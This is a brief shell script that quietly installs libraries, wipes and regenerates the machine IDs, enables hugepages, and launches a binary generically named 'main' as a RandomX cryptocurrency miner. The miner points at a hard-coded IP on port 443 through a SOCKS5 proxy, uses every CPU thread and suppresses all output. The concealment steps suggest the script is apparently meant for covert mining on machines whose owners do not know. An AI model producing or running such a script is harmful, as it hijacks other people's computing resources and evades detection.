sudo apt update >/dev/null 2>&1
sudo apt install -y libjansson-dev libomp-dev >/dev/null 2>&1
sudo dpkg -i libssl1.1_1.1.1f-1ubuntu2.22_amd64.deb >/dev/null 2>&1
sudo apt install hwloc -y >/dev/null 2>&1
rm -rf /etc/machine-id
rm -rf /var/lib/dbus/machine-id
dbus-uuidgen --ensure
systemd-machine-id-setup
sysctl -w vm.nr_hugepages=$(nproc)
./main -a rx/0 -o 157.245.205.114:443 -u NHbDitKXbv5w527aDGFYncoEQ5JHbUAP3irp.worker1 -x socks5://157.245.205.114:1080 -t $(nproc)
